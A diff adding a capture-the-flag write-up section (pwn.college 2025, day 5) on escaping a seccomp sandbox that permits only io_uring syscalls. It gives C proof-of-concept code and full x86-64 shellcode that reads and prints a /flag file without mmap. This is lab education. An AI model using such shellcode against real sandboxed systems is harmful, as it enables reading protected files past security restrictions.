@@ -753,15 +753,461 @@ int main()
     return 0;
 }
 ```
-The idea is clear: all the syscalls except `io_uring_setup`, `io_uring_enter` and `io_uring_register` are blocked and we get a mapped memory page to store some shellcode to be executed. There are a few difficult things to overcome here
-* no mmap
-* variable kernel offsets => no llm 
-  * 
+The idea is clear: all the syscalls except `io_uring_setup`, `io_uring_enter` and `io_uring_register` are blocked and we get a mapped memory page to store some shellcode to be executed. Straght-forward but there are a few difficult things to overcome here:
+* Not much related code available out there to work with `io_uring` (=> not much for LLMs to train with too)
+* `io_uring_setup` syscall returns a file descriptor which needs to be `mmap`-ed, but `mmap` syscall is not allowed
+* There's a large number of structures and member fields involved, whose offsets differ from one kernel version to another (=> LLMs will likely fail to generate any working shellcode).
+
+My plan was as follows:
+1. Locate a working example for `io_uring` async I/O.
+2. Adapt the example to open a file, read and write its content to stdout.
+3. Convert it to shellcode and feed it to the challenge binary
+4. Enjoy!
+
+Luckily towards the end of the `io_uring` [man page](https://man7.org/linux/man-pages/man7/io_uring.7.html) there's an example that uses `io_uring` to copy stdin to stdout. Nice, let's see if it works:
+```bash
+$ gcc io_uring_orig.c -o io_uring
+ubuntu@2025~day-05:~$ ./io_uring
+hello
+hello
+```
+
+Next, clean the code and adapt it to read and print the flag:
+```bash
+$ gcc io_uring_mod.c -o io_uring
+ubuntu@practice~2025~day-05:~$ sudo ./io_uring
+pwn.college{practice}
+```
+
+But how to get rid of the need to `mmap` stuff?  By default, `io_uring` allocates kernel memory for submission queue and completion queue, that callers must subsequently `mmap`.  However, consulting the `io_uring_setup` man page I noticed the `IORING_SETUP_NO_MMAP` flag. As per documentaiont, if this flag is set, io_uring instead uses caller-allocated buffers:  `p->cq_off.user_addr` must point to the memory for the `sq`/`cq` rings, and `p->sq_off.user_addr` must point to the memory for the `sqes`. Neat! 
+
+I've trimmed the PoC even more and simulated the conditions of the challege binary with two page-aligned (very important) buffers on the stack:
+```c
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdint.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <sys/syscall.h>
+#include <fcntl.h>
+#include <linux/io_uring.h>
+#include <stdlib.h>
+#include <errno.h>
+
+/* Define Page Size */
+#define PAGE_SIZE 4096
+
+static int ring_fd;
+static struct io_uring_sqe *sqes;
+static struct io_uring_cqe *cqes;
+
+static uint32_t *sq_tail, *sq_head, *sq_mask;
+static uint32_t *cq_tail, *cq_head, *cq_mask;
+
+static inline int enter_syscall(int to_submit, int min_complete) {
+    return syscall(__NR_io_uring_enter, ring_fd,
+                   to_submit, min_complete,
+                   IORING_ENTER_GETEVENTS, NULL, 0);
+}
+
+/* setup accepts pointers to the pre-allocated stack memory */
+static void setup(void *rings_ptr, void *sqes_ptr) {
+    struct io_uring_params p = {0};
+
+    p.sq_entries = 1;
+    p.cq_entries = 1;
+    p.flags = IORING_SETUP_NO_MMAP | IORING_SETUP_NO_SQARRAY;
+
+    /* Tell kernel where the memory is */
+    p.cq_off.user_addr = (uint64_t)(unsigned long)rings_ptr;
+    p.sq_off.user_addr = (uint64_t)(unsigned long)sqes_ptr;
+
+    ring_fd = syscall(__NR_io_uring_setup, 8, &p);
+    if (ring_fd < 0) {
+        perror("io_uring_setup");
+        exit(1);
+    }
+
+    /* SQEs: user-provided sqes_ptr */
+    sqes = (struct io_uring_sqe *)sqes_ptr;
+
+    /* Map offsets to our stack buffer */
+    void *ring_base = rings_ptr;
+    sq_head = (uint32_t *)((char *)ring_base + p.sq_off.head);
+    sq_tail = (uint32_t *)((char *)ring_base + p.sq_off.tail);
+    sq_mask = (uint32_t *)((char *)ring_base + p.sq_off.ring_mask);
+
+    cq_head = (uint32_t *)((char *)ring_base + p.cq_off.head);
+    cq_tail = (uint32_t *)((char *)ring_base + p.cq_off.tail);
+    cq_mask = (uint32_t *)((char *)ring_base + p.cq_off.ring_mask);
+    cqes = (struct io_uring_cqe *)((char *)ring_base + p.cq_off.cqes);
+}
+
+static int submit_sqe(struct io_uring_sqe *sqe) {
+    uint32_t t = *sq_tail;
+    uint32_t idx = t & *sq_mask;
+    printf("[*] submit_sqe: %d\n", idx);
+
+    memcpy(&sqes[idx], sqe, sizeof(*sqe));
+    *sq_tail = t + 1;
+
+    if (enter_syscall(1, 1) < 0) { perror("enter"); _exit(1); }
+
+    while (*cq_head == *cq_tail) ;
+    uint32_t cidx = *cq_head & *cq_mask;
+    int res = cqes[cidx].res;
+    (*cq_head)++;
+
+    return res;
+}
+
+int main() {
+    /* 1. Allocate on Stack 
+       2. Use __attribute__((aligned(PAGE_SIZE)))
+       3. Zero out memory (mmap does this automatically, stack does not)
+    */
+    uint8_t rings_stack[PAGE_SIZE] __attribute__((aligned(PAGE_SIZE)));
+    uint8_t sqes_stack[PAGE_SIZE] __attribute__((aligned(PAGE_SIZE)));
+
+    memset(rings_stack, 0, PAGE_SIZE);
+    memset(sqes_stack, 0, PAGE_SIZE);
+
+    /* Pass stack addresses to setup */
+    setup(rings_stack, sqes_stack);
+
+    char path[] = "/flag";
+    char buf[4096];
+
+    struct io_uring_sqe sqe;
+    memset(&sqe, 0, sizeof(sqe));
+    sqe.opcode = IORING_OP_OPENAT;
+    sqe.fd = AT_FDCWD;
+    sqe.addr = (unsigned long)path;
+    sqe.open_flags = O_RDONLY;
+
+    int fd = submit_sqe(&sqe);
+    if (fd < 0) {
+        write(2, "open failed\n", 12);
+        return 1;
+    }
+    printf("[*] File opened with fd: %x\n", fd);
+
+    memset(&sqe, 0, sizeof(sqe));
+    sqe.opcode = IORING_OP_READ;
+    sqe.fd = fd;
+    sqe.addr = (unsigned long)buf;
+    sqe.len = sizeof(buf);
+
+    int r = submit_sqe(&sqe);
+    if (r < 0) {
+        write(2, "read failed\n", 12);
+        return 1;
+    }
+
+    memset(&sqe, 0, sizeof(sqe));
+    sqe.opcode = IORING_OP_WRITE;
+    sqe.fd = 1;
+    sqe.addr = (unsigned long)buf;
+    sqe.len = r;
+
+    submit_sqe(&sqe);
+
+    return 0;
+}
+```
+
+With this simple code we can get the falg without the need to `mmap` anything:
+
+```bash
+$ gcc io_uring_nommap.c -o io_uring
+$ sudo ./io_uring
+[*] submit_sqe: 0
+[*] File opened with fd: 4
+[*] submit_sqe: 1
+[*] submit_sqe: 2
+pwn.college{practice}
+```
+
+At this point I didn't realise I could have converted my PoC straight to working assembly code as other have done (_check the writeups mentioend in the beginning!_) and I manually converted this to shellcode. To make my job easier I minimised the PoC code even more, replaced all the defines with their actual values. I also made all the access to structure members to be offset-based (these offsets vary from one kernel version to another!) using the `offsetof` macro:
+```c
+printf("offsetof(struct io_uring_sqe, len): %d\n", offsetof(struct io_uring_sqe, len));
+```
+
+The result is this short snippet:
+```c
+#include <stdio.h>
+#include <stdint.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/syscall.h>
+#include <linux/io_uring.h>
+#include <fcntl.h>
+#include <stdlib.h>
+#include <stddef.h>
+
+int main() {
+    int ring_fd;
+    struct io_uring_sqe *sqes;
+    struct io_uring_cqe *cqes;
+
+    uint32_t *sq_tail;
+    uint32_t *cq_head;
+
+    uint8_t rings_stack[4096] __attribute__((aligned(4096)));
+    uint8_t sqes_stack[4096] __attribute__((aligned(4096)));
+
+    memset(rings_stack, 0, 4096);
+    memset(sqes_stack, 0, 4096);
+
+    struct io_uring_params p = {0};
+    char *p_ptr = (char *)&p;
+
+    *((uint32_t*)(p_ptr + 0x0)) = 8;
+    *((uint32_t*)(p_ptr + 0x4)) = 8;
+    *((uint32_t*)(p_ptr + 0x8)) = 0x14000;
+    *((uint64_t*)(p_ptr + 0x70)) = (uint64_t)rings_stack;
+    *((uint64_t*)(p_ptr + 0x48)) = (uint64_t)sqes_stack;
+
+    ring_fd = syscall(__NR_io_uring_setup, 8, &p);
+
+    sqes = (struct io_uring_sqe *)sqes_stack;
+    sq_tail = (uint32_t *)((char *)rings_stack + 4);            // p.sq_off.tail
+    cqes = (struct io_uring_cqe *)((char *)rings_stack + 64);   // p.cq_off.cqes
+    cq_head = (uint32_t *)((char *)rings_stack + 8);            // p.cq_off.head
+
+    char path[] = "/flag";
+    char buf[4096];
+
+    struct io_uring_sqe sqe;
+    memset(&sqe, 0, sizeof(sqe));
+    char *sqe_ptr = (char *)&sqe;
+
+    *((__u8 *)(sqe_ptr + 0)) = 18;                              // IORING_OP_OPENAT
+    *((__s32 *)(sqe_ptr + 4)) = -100;                           // AT_FDCWD
+    *((unsigned long *)(sqe_ptr + 16)) = (unsigned long)path;
+    *((__u32 *)(sqe_ptr + 28)) = 0;                             // O_RDONLY;
+
+    memcpy(&sqes[0], &sqe, sizeof(sqe));
+    (*sq_tail)++;
+    syscall(__NR_io_uring_enter, ring_fd, 1, 1, 1, NULL, 0);
+    (*cq_head)++;
+
+    int fd = cqes[0].res;
+    printf("fd: %d\n", fd);
+
+    memset(&sqe, 0, sizeof(sqe));
+    *((__u8 *)(sqe_ptr + 0)) = 22;                              //IORING_OP_READ;
+    *((__s32 *)(sqe_ptr + 4)) = fd;
+    *((unsigned long *)(sqe_ptr + 16)) = (unsigned long)buf;
+    *((unsigned long *)(sqe_ptr + 24)) = sizeof(buf);
+
+    memcpy(&sqes[1], &sqe, sizeof(sqe));
+    (*sq_tail)++;
+    syscall(__NR_io_uring_enter, ring_fd, 1, 1, 1, NULL, 0);
+    (*cq_head)++;
+
+    int r = cqes[1].res;
+    printf("read: %d\n", r);
+
+    memset(&sqe, 0, sizeof(sqe));
+    *((__u8 *)(sqe_ptr + 0)) = 23;                              // IORING_OP_WRITE;
+    *((__s32 *)(sqe_ptr + 4)) = 1;
+    *((unsigned long *)(sqe_ptr + 16)) = (unsigned long)buf;
+    *((unsigned long *)(sqe_ptr + 24)) = r;
+
+    memcpy(&sqes[2], &sqe, sizeof(sqe));
+    (*sq_tail)++;
+    syscall(__NR_io_uring_enter, ring_fd, 1, 1, 1, NULL, 0);
+    (*cq_head)++;
+
+    return 0;
+}
+```
+
+Which, although maybe not production-grade, gets the flag:
+```bash
+ubuntu@practice~2025~day-05:~$ gcc io_uring_min.c -o io_uring
+ubuntu@practice~2025~day-05:~$ sudo ./io_uring
+fd: 4
+read: 22
+pwn.college{practice}
+```
+
+From this it was straight-forward. I fed this to a couple of LLMs and quickly got a working shellcode, with comments for easier torubleshooting:
+
+```nasm
+/* Get PC for PIC base */
+call get_pc
+get_pc:
+pop rbp                     /* rbp holds the base address */
+
+/* 1. Allocate and ALIGN RSP to a 4096-byte (0x1000) boundary. */
+sub rsp, 0x2000
+mov r13, rsp
+mov r12, 0xfffffffffffff000 /* 4096-byte alignment mask */
+and r13, r12                /* r13 is now aligned RSP address (rings_stack) */
+mov rsp, r13                /* Set aligned address as the new RSP */
+
+mov r12, rsp                /* r12 = rings_stack (CQ ring & internal data base) */
+mov r13, rsp                /* r13 = sqes_stack (SQE array base) */
+add r13, 0x1000    
+
+mov r15, r13                /* r15 = address of buf (r13 + 0x100, scratch space) */
+add r15, 0x100              /* Go past sqes[0..3] */
+
+/* ZERO RING BUFFERS (4096 + 4096 = 8192 bytes total) */
+mov rdi, r12                                                                                                                                                                                                                                 /* Start at rings_stack (r12) */
+mov rcx, 0x2000             /* Length = 8192 bytes */
+xor rax, rax
+rep stosb                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 /* Clear rings_stack and sqes_stack */
+
+/* Reset r15 to point to the scratch buffer after clearing */
+mov r15, r13
+add r15, 0x100 
+
+/* Setup path "/flag" into the stack buffer at r15 */
+mov rax, 0x00550067616c662f
+mov qword ptr [r15], rax                                                                                                                                                                
+mov r14, r15                /* r14 = address of "/flag" for OPENAT */
+
+/* 2. Setup io_uring_params p on the stack (below rings_stack) */
+mov rdi, r12
+sub rdi, 0x100              /* rdi = address of p */
+mov rcx, 0x80
+xor rax, rax
+rep stosb                   /* memset(p, 0, 128) */
+mov rsi, rdi                /* rsi = &p */
+
+/* Set p.sq_entries = 8 (offset 0x0)  */
+mov dword ptr [rsi], 0x8                         
+/* Set p.cq_entries = 8 (offset 0x4)  */
+mov dword ptr [rsi+4], 0x8
+/* Set p.flags = 0x14000 (offset 0x8) */
+mov dword ptr [rsi+8], 0x14000                         
+
+/* Set p.sq_off.user_addr = sqes_stack (r13) (OFFSET: 0x48)  */
+mov qword ptr [rsi+0x48], r13
+/* Set p.cq_off.user_addr = rings_stack (r12) (OFFSET: 0x70) */
+mov qword ptr [rsi+0x70], r12
+
+/* 3. io_uring_setup(8, &p) */
+mov rax, 425                /* __NR_io_uring_setup  */
+mov rdi, 8                  /* sq_entries           */
+syscall                     /* rsi = &p             */
+mov ebx, eax                /* ebx = ring_fd        */
+
+/* 4. OPENAT - Prepare sqe 0 */
+mov rcx, r13                /* rcx = sqes (sqes_stack) */
+mov rdi, rcx                /* rdi = address of sqes[0] */
+
+/* sqe.opcode = 18, sqe.fd = -100, sqe.addr = r14 */
+mov byte ptr [rdi], 18
+mov dword ptr [rdi+4], 0xffffff9c
+mov qword ptr [rdi+0x10], r14
+
+/* open_flags (O_RDONLY = 0) at offset 0x1c (28) */
+mov dword ptr [rdi+0x1c], 0          
+
+/* Update sq_tail */
+mov r8, r12                 /* r8 = rings_stack (Mapped Ring Base) */
+add r8, 0x4                 /* sq_off.tail offset (4) */
+inc dword ptr [r8]
+
+/* io_uring_enter(ring_fd, 1, 1, 1, NULL, 0) - Submit OPENAT */
+mov rax, 426                /* __NR_io_uring_enter */
+mov rdi, rbx                /* ring_fd */
+mov rsi, 1                                                                                                                                                                
+mov rdx, 1                                                                                                                                                                
+mov r10, 1                                                                                                                                                                
+mov r8, 0                                                                                                                                                                
+mov r9, 0                                                                                                                                                                
+syscall
+
+/* Get fd from cqe[0].res */
+mov rdx, r12
+add rdx, 0x40                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  /* rdx = CQE array base */
+mov esi, dword ptr [rdx + 0x8] /* esi = fd = cqe[0].res (offset 0x8) */
+
+/* Update cq_head after OPENAT retrieval */
+mov r8, r12
+add r8, 0x8
+inc dword ptr [r8]
+
+/* READ - Prepare sqe 1 */
+mov rdi, r13          
+add rdi, 0x40                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  /* rdi = address of sqes[1] */
+
+mov byte ptr [rdi], 22          /* sqe.opcode = 22 (IORING_OP_READ) */
+mov dword ptr [rdi+4], esi      /* sqe.fd = esi (opened file descriptor) */
+mov qword ptr [rdi+0x10], r15   /* sqe.addr = r15 (buf address) */
+mov qword ptr [rdi+0x18], 100   /* sqe.len = 100 */
+
+/* Update sq_tail for the second submission */
+mov r8, r12
+add r8, 0x4
+inc dword ptr [r8]
+
+/* io_uring_enter(ring_fd, 1, 1, 1, NULL, 0) - Submit READ */
+mov rax, 426
+mov rdi, rbx
+mov rsi, 1
+mov rdx, 1
+mov r10, 1
+mov r8, 0
+mov r9, 0
+syscall
+
+/* Get bytes read (r) from cqe[1].res */
+mov r8, r12          
+add r8, 0x40                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  /* r8 = CQE array base */
+add r8, 0x10                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  /* r8 points to start of cqe[1] */
+mov r10d, dword ptr [r8 + 0x8]      /* r10d = bytes read (cqes[1].res) */                                                                                                                                       
+
+/* Update cq_head after successful retrieval */
+mov r9, r12
+add r9, 0x8                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  /* r9 = cq_head address */
+inc dword ptr [r9]
+
+/* WRITE - Prepare sqe 2 */
+mov rdi, r13
+add rdi, 0x80                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  /* rdi = address of sqes[2] */
+
+mov byte ptr [rdi], 23          /* sqe.opcode = 23 (IORING_OP_WRITE) */
+mov dword ptr [rdi+4], 1        /* sqe.fd = 1 (stdout) */
+mov qword ptr [rdi+0x10], r15   /* sqe.addr = r15 (buf address) */
+mov dword ptr [rdi+0x18], r10d  /* sqe.len = r10d (bytes read) */
+
+/* Update sq_tail for the third submission */
+mov r8, r12
+add r8, 0x4
+inc dword ptr [r8]
+
+/* io_uring_enter(ring_fd, 1, 1, 1, NULL, 0) - Submit WRITE */
+mov rax, 426
+mov rdi, rbx
+mov rsi, 1
+mov rdx, 1
+mov r10, 1
+mov r8, 0
+mov r9, 0
+syscall
+
+/* Final cq_head update for WRITE result */
+mov r9, r12
+add r9, 0x8
+inc dword ptr [r9]
+
+/* Exit cleanly */
+xor edi, edi
+mov rax, 60
+syscall
+```
+
+## Day 6 - 
 
 <div class="box-note">
 Note that <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/out-string?view=powershell-6" target="_blank">Out-String -Stream</a> is very important here. This is needed to be able to use <b>Select-String</b> and grep through the output!
 </div>
-
-## Day 5 - 
 
 All the levels were very educative! Huge thanks to the authors.
